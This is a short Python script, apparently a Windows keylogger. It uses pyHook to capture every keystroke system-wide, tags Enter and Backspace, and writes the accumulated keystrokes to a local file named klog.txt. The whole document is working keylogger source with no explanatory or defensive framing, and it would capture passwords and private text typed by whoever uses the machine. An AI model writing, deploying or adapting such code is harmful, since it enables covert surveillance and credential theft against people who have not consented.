#!/usr/bin/python3

import pyHook, pythoncom

def keypressed(event):
    global store
    # Enter & backspace will be ahrdcoded to <
    if event.Ascii == 13:
        keys='<Enter>'
    elif event.Ascii == 8:
        keys=('<Backspace>')
    else:
        keys=chr(event.Ascii)

    store += keys
    fp = open("klog.txt",'w')
    fp.write(store)
    fp.close()

    return True


store = ''
obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()


#end
